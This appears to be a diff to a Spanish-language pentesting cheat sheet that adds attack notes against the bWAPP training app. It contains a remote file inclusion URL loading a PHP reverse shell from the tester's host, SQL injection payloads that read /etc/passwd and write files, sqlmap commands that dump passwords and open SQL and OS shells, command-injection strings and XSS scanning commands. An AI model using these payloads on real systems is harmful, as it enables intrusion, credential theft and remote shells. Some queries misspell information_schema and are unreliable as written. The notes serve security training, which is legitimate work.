@@ -85,6 +85,21 @@ assetfinder target.com | hakrawler | kxss
 
 --- 
 
+**Opción usando QuickXSS**  
+  
+https://github.com/theinfosecguy/QuickXSS  
+Ejecutar install.sh para instalar dependencias.  
+Luego 
+```
+./QuickXSS.sh -d <target.com>
+./QuickXSS.sh -d <target.com> -b <blindxss.xss.ht>
+./QuickXSS.sh -d <target.com> -o xss_results.txt 
+./QuickXSS.sh -d <target.com> -b <blindxss.xss.ht> -o xss_results.txt
+```
+
+
+--- 
+
 **Pasos de S4vitar para pentesting**   
 
 1)  
@@ -268,5 +283,89 @@ dotdotpwn -m payload -h ip -p /root/dt.txt -o unix -f /etc/passwd -d 3 -x 80 -b 
 dotdotpwn -m payload -h ip -p /root/dt.txt -o unix -f /etc/passwd -d 3 -x 80 -k "root"
 ```
 
+- File inclusion
+
+Ejemplo  
+```
+http://192.168.204.130/bWAPP/rifi.php?language=http://imdb.com&action=go
+http://192.168.204.130/bWAPP/rifi.php?language=http://myip/php-reverse-shell.phpaction=go
+```
+
+- HTTP Only Cookies  
+
+Sirve para que desde javascript no se pueda leer el valor de las cookies.  
+
+- Secure Cookies  
+
+Detecta que el sitio sea https.  
+
+- XSS  
+
+Ya explicado en varios lugares.  
+La vulnerabilidad aplica cuando se inserta codigo JS en una página.  
+Ya sea x url , en un form, en redirect, etc.   
+
+- SQL Injection  
+
+Podemos usar errores, union , booleanos, out-of-band , time-delay.  
+Ejemplos a usar en inputs:  
+
+```
+'#
+' order by 10#
+' order by 7#
+' union select 1,2,3,4,5,6,7#
+' union select 1,version(),database(),user(),5,6,7#
+' union select 1,load_file('/etc/passwd'),3,4,5,6,7#
+4 OR 1=1
+4 order by 1
+' or 1=1 and sleep(0,10)#
+```
+
+Ejemplos para usar modificando el valor de un parametro en un POST  
+```
+4 or 1=1
+0 union select 1,version(), database(), user(),5,6,7
+0 union select 1,schema_name,default_character_set_name,default_collation_name, 5,6,7 from information_schema.schemata limit 0,1
+0 union select 1,table_name,3,4,5,6,7 from informatin_schema.tables limit 0,1
+0 union select 1,group_concat(table_name),3,4,5,6,7 from informatin_schema.tables where table_schema='bWAPP'
+0 union select 1,group_concat(column_name),3,4,5,6,7 from informatin_schema.columns where table_schema='bWAPP' and table_name='movies'
+null union select * from movies into OUTFILE '/var/www/xxxx/documents/result.txt'
+null union select 1,load_file('/var/www/xxxx/documents/result.txt'),3,4,5,6,7 
+0 union select 1,group_concat(table_name),3,4,5,6,7 from informatin_schema.tables where table_schema=CHAR(98,87,65,80,80)
+```
+
+Completando un form que luego graba los datos  
+```
+a', (select concat_ws(0x3a,schema_name,default_character_set_name,default_collation_name) from information_schema.schemata limit 0,1))#
+a', (select concat_ws(0x3a,schema_name,default_character_set_name,default_collation_name) from information_schema.schemata limit 1,1))#
+```
+
+- SQLmap
+
+```
+sqlmap -h
+sqlmap -hh
+
+sqlmap -u 'url?param=value' -p title --cookie "get_the_cookie_Value_from_browser..." --random-agent -H "PENTEST:31.11.2021"  --dbms MySQL --os Linux -f -b --current-user --current-db --is-dba 
+sqlmap -u 'url?param=value' -p title --cookie "get_the_cookie_Value_from_browser..." --random-agent -H "PENTEST:31.11.2021" --users --passwords --privileges --roles
+sqlmap -u 'url?param=value' -p title --cookie "get_the_cookie_Value_from_browser..." --random-agent -H "PENTEST:31.11.2021" --dbs --schema
+sqlmap -u 'url?param=value' -p title --cookie "get_the_cookie_Value_from_browser..." --random-agent -H "PENTEST:31.11.2021" --sql-shell
+sqlmap -u 'url?param=value' -p title --cookie "get_the_cookie_Value_from_browser..." --random-agent -H "PENTEST:31.11.2021" --os-shell
+```
+
+- Command injection
+
+Es cuando por ejemplo tenemos un input q pide un nombre de dominio, y ejecuta por detras un comando de sistema como puede ser "ping".  
+Entonces se agrega diferentes comandos:   
+```
+www.google.com & pwd
+www.google.com && pwd
+www.google.com | pwd
+www.google.com ; pwd
+www.google.com; pwd
+```
+
+También se puede usar la herramienta Commix.  
 
 
